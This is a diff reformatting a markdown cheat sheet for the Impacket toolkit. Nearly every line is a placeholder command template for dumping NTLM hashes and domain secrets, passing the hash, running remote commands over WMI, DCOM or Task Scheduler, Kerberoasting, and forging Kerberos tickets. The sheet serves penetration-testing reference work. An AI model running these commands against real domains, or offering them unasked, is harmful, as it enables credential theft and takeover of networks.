@@ -2,184 +2,272 @@
 legal-banner: true
 ---
 
-### **IMPACKET TOOLKIT**
+### **Impacket Toolkit**
 
 Impacket is a collection of Python classes for working with network protocols. It is highly regarded in the cybersecurity community for its ability to handle low-level network tasks and its extensive support for various protocols, making it an essential toolkit for penetration testers and security researchers.
 
-### **PROTOCOLS SUPPORTED:**
-
 ### **SMB/SMB2**
 
-SMBCLIENT.PY: Interactive SMB client to work with shares.
+**smbclient.py** – Interactive SMB client to work with shares.
 
-   1.  Access SMB shares interactively  
-        `smbclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]`
+1. Access SMB shares interactively  
+```bash
+smbclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]
+```  
+2. List all available shares on the target  
+```bash
+smbclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -L
+```  
 
-   2.  Lists all available shares on the target.  
-        `smbclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -L`
+**secretsdump.py** – Dump secrets from a remote machine without executing any agent.
 
-SECRETSDUMP.PY: Dumps secrets from the remote machine without executing any agent.
-    
-   1.  Dumps NTLM hashes of all domain users from a domain controller.  
-        `secretsdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]`
+1. Dump NTLM hashes of all domain users from a domain controller  
+```bash
+secretsdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]
+```  
 
-   2.  Dump NTLM Hashes Using Pass-the-Hash:  
-        `secretsdump.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]`
-		
-NETVIEW.PY: Enumerates shares and sessions on the network.
-    
-1.  Enumerate network shares and sessions  
-     `netview.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]`
-2.  Enumerate Shares Using Pass-the-Hash:  
-     `netview.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]`
+2. Dump NTLM hashes using Pass-the-Hash  
+```bash
+secretsdump.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]
+```  
+
+**netview.py** – Enumerate shares and sessions on the network.
+
+1. Enumerate network shares and sessions  
+```bash
+netview.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]
+```  
+
+2. Enumerate shares using Pass-the-Hash  
+```bash
+netview.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]
+```  
 
 ### **MSRPC**
 
-RPCCLIENT.PY: A tool to execute client-side MSRPC calls.
+**rpcclient.py** – Execute client-side MSRPC calls. 
 
-1.  Execute MSRPC client calls  
-      `rpcclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]`
+1. Execute MSRPC client calls  
+```bash
+rpcclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]
+```
 
-2.  Enumerate Domain Users:  
-      `rpcclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -c "enumdomusers"`
+2. Enumerate domain users  
+```bash
+rpcclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -c "enumdomusers"
+```
 
-3.  Enumerate Domain Groups:  
-      `rpcclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -c "enumdomgroups"`
+3. Enumerate domain groups  
+```bash
+rpcclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -c "enumdomgroups"
+```
 
- 4.  Execute Command on Target Machine:  
-     `rpcclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -c "cmd"`
+4. Execute command on target machine  
+```bash
+rpcclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -c "cmd"
+```  
 
-RPCDUMP.PY: Dumps information about endpoints and interfaces.
- 
- 1.  Dump RPC endpoints and interfaces info  
-     `rpcdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]`
+**rpcdump.py** – Dump information about endpoints and interfaces.
 
-2.  Dump RPC Endpoints Using Pass-the-Hash:  
-     `rpcdump.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]`
+1. Dump RPC endpoints and interfaces info  
+```bash
+rpcdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]
+```
 
-3.  Dump RPC Endpoints with No Credentials:  
-    `rpcdump.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS]`
+2. Dump RPC endpoints using Pass-the-Hash  
+```bash
+rpcdump.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]
+```
+
+3. Dump RPC endpoints with no credentials  
+```bash
+rpcdump.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS]
+```  
 
 ### **DCE/RPC**
 
-ATEXEC.PY: Executes commands using the Task Scheduler service.
+**atexec.py** – Execute commands using Task Scheduler.
 
-1.  Execute command using Task Scheduler  
-    `atexec.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] [COMMAND]`
+1. Execute command using Task Scheduler  
+```bash
+atexec.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] [COMMAND]
+```
 
-2.  Execute Command Using Pass-the-Hash:  
-   `atexec.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]`
+2. Execute command using Pass-the-Hash  
+```bash
+atexec.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]
+```
 
-3.  Execute Command with No Credentials:  
-    `atexec.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]`
+3. Execute command with no credentials  
+```bash
+atexec.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]
+```  
 
-WMIEXEC.PY: Executes commands via WMI.
+**wmiexec.py** – Execute commands via WMI.
 
-1.  Execute command via WMI  
-        `wmiexec.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] [COMMAND]`
+1. Execute command via WMI  
+```bash
+wmiexec.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] [COMMAND]
+```
 
-2.  Execute Command Using Pass-the-Hash:  
-        `wmiexec.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS] [command]`
+2. Execute command using Pass-the-Hash  
+```bash
+wmiexec.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]
+```
 
-3.  Execute Command with No Credentials:  
-        `wmiexec.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]`
+3. Execute command with no credentials  
+```bash
+wmiexec.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]
+```  
 
-DCOMEXEC.PY: Executes commands using DCOM.
+**dcomexec.py** – Execute commands using DCOM. 
 
-1.  Execute command using DCOM  
-      `dcomexec.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] [COMMAND]`
+1. Execute command using DCOM  
+```bash
+dcomexec.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] [COMMAND]
+```
 
-2.  Execute Command Using Pass-the-Hash:  
-      `dcomexec.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]`
+2. Execute command using Pass-the-Hash  
+```bash
+dcomexec.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]
+```
 
-3.  Execute Command with No Credentials:  
-    `dcomexec.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]`
+3. Execute command with no credentials  
+```bash
+dcomexec.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]
+```  
 
 ### **LDAP**
 
-GETADUSERS.PY: Enumerates all users in the domain.
-    
-1.  Enumerate all domain users  
-    `GetADUsers.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]`
+#### **GetADUsers.py** – Enumerate all users in the domain.
 
-2.  Enumerate all users including disabled accounts  
-   `GetADUsers.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -all`
+1. Enumerate all domain users  
+```bash
+GetADUsers.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]
+```
 
-3.  Use Pass-the-Hash for Enumeration:  
-   `GetADUsers.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]`
+2. Enumerate all users including disabled accounts  
+```bash
+GetADUsers.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -all
+```
 
-GETUSERSPNS.PY: Enumerates Service Principal Names (SPNs) that are associated with user accounts.
-    
-1.  Enumerate user SPNs  
-   `GetUserSPNs.py [DOMAIN]/[USERNAME]:[PASSWORD] -dc-ip [IP-ADDRESS]`
+3. Use Pass-the-Hash for enumeration  
+```bash
+GetADUsers.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]
+```  
 
-2.  Request TGS for identified SPNs  
-   `GetUserSPNs.py [DOMAIN]/[USERNAME]:[PASSWORD] -request -dc-ip [IP-ADDRESS]`
+#### **GetUserSPNs.py** – Enumerate Service Principal Names (SPNs).
 
-3. Use Pass-the-Hash to enumerate SPNs.  
-    `GetUserSPNs.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME] -dc-ip [IP-ADDRESS]`
+1. Enumerate user SPNs  
+```bash
+GetUserSPNs.py [DOMAIN]/[USERNAME]:[PASSWORD] -dc-ip [IP-ADDRESS]
+```
 
-WINDAPSEARCH.PY: performs LDAP queries against Windows Active Directory to enumerate objects like users and groups.
-    
-1.  Enumerates Group Policy Objects  
-   `python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --gpos`
+2. Request TGS for identified SPNs  
+```bash
+GetUserSPNs.py [DOMAIN]/[USERNAME]:[PASSWORD] -request -dc-ip [IP-ADDRESS]
+```
 
-2.  Enumerates objects with administrative privileges  
-   `python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --admin-objects`
+3. Use Pass-the-Hash to enumerate SPNs  
+```bash
+GetUserSPNs.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME] -dc-ip [IP-ADDRESS]
+```  
 
-3.  Enumerates users with Service Principal Names (SPNs)  
-   `python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --user-spns`
+#### **windapsearch.py** – Perform LDAP queries against Active Directory. 
 
-4.  Enumerates users with unconstrained delegation  
-    `python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --unconstrained-users`
+1. Enumerate Group Policy Objects  
+```bash
+python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --gpos
+```
 
-5.  Enumerates computers with unconstrained delegation  
-   `python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --unconstrained-computers`
+2. Enumerate objects with administrative privileges  
+```bash
+python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --admin-objects
+```
 
-### **KERBEROS**
+3. Enumerate users with SPNs  
+```bash
+python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --user-spns
+```
 
-TICKETER.PY: Generates Kerberos tickets that can be used for various attacks.
+4. Enumerate users with unconstrained delegation  
+```bash
+python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --unconstrained-users
+```
 
-1.  Generate a TGT ticket for a user  
-   `ticketer.py -nthash [NTHASH] -domain-sid [SID] [USERNAME]`
+5. Enumerate computers with unconstrained delegation  
+```bash
+python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --unconstrained-computers
+```  
 
-2.  Generate a service ticket for a user and SPN  
-   `ticketer.py -nthash [NTHASH] -domain-sid [SID] -request [USERNAME] [SPN]`
+### **Kerberos**
 
-3.  Generate TGT Ticket with AES Encryption:  
-   `ticketer.py -aesKey [AESKEY] -domain-sid [SID] [USERNAME]`
+#### **ticketer.py** – Generate Kerberos tickets.
 
-GETNPUSERS.PY: Checks for accounts with Kerberos pre-authentication disabled and extracts their TGT data.
+1. Generate a TGT ticket for a user  
+```bash
+ticketer.py -nthash [NTHASH] -domain-sid [SID] [USERNAME]
+```
 
-1.  Enumerate accounts with pre-auth disabled  
-   `GetNPUsers.py [DOMAIN]/[USERNAME]:[PASSWORD] -dc-ip [IP-ADDRESS]`
+2. Generate a service ticket for a user and SPN  
+```bash
+ticketer.py -nthash [NTHASH] -domain-sid [SID] -request [USERNAME] [SPN]
+```
 
-2.  Request TGT for identified accounts  
-   `GetNPUsers.py [DOMAIN]/[USERNAME]:[PASSWORD] -request -dc-ip [IP-ADDRESS]`
+3. Generate TGT ticket with AES encryption  
+```bash
+ticketer.py -aesKey [AESKEY] -domain-sid [SID] [USERNAME]
+```  
 
-3.  Request TGT Using Kerberos Authentication:  
-   `GetNPUsers.py -k [DOMAIN]/[USERNAME] -request -dc-ip [IP-ADDRESS]`
+**GetNPUsers.py** – Check for accounts with pre-authentication disabled.
+
+1. Enumerate accounts with pre-auth disabled  
+```bash
+GetNPUsers.py [DOMAIN]/[USERNAME]:[PASSWORD] -dc-ip [IP-ADDRESS]
+```
+
+2. Request TGT for identified accounts  
+```bash
+GetNPUsers.py [DOMAIN]/[USERNAME]:[PASSWORD] -request -dc-ip [IP-ADDRESS]
+```
+
+3. Request TGT using Kerberos authentication  
+```bash
+GetNPUsers.py -k [DOMAIN]/[USERNAME] -request -dc-ip [IP-ADDRESS]
+```  
 
 ### **NTLM**
 
-LOOKUPSID.PY: Enumerates domain SID information.
+**lookupsid.py** – Enumerate domain SID information.
 
-1.  Enumerate domain SID info  
-     `lookupsid.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]`
+1. Enumerate domain SID info  
+```bash
+lookupsid.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]
+```
 
-2.  Enumerate Domain SID Info Using Pass-the-Hash:  
-     `lookupsid.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]`
+2. Enumerate domain SID info using Pass-the-Hash  
+```bash
+lookupsid.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]
+```
 
-3.  Enumerate Domain SID Info with No Credentials:  
-      `lookupsid.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS]`
+3. Enumerate domain SID info with no credentials  
+```bash
+lookupsid.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS]
+```  
 
-SECRETSDUMP.PY: Dumps secrets from the remote machine without executing any agent.
+**secretsdump.py** – Dump secrets from remote machines.
 
-1.  Dump secrets from a remote machine  
-     `secretsdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]`
+1. Dump secrets from a remote machine  
+```bash
+secretsdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]
+```
 
-2.  Dump secrets from the domain controller  
-    `secretsdump.py -just-dc-user [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]`
+2. Dump secrets from the domain controller  
+```bash
+secretsdump.py -just-dc-user [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]
+```
 
-3.  Dump Secrets Using Pass-the-Hash:  
-   `secretsdump.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]`
+3. Dump secrets using Pass-the-Hash  
+```bash
+secretsdump.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]
+```  
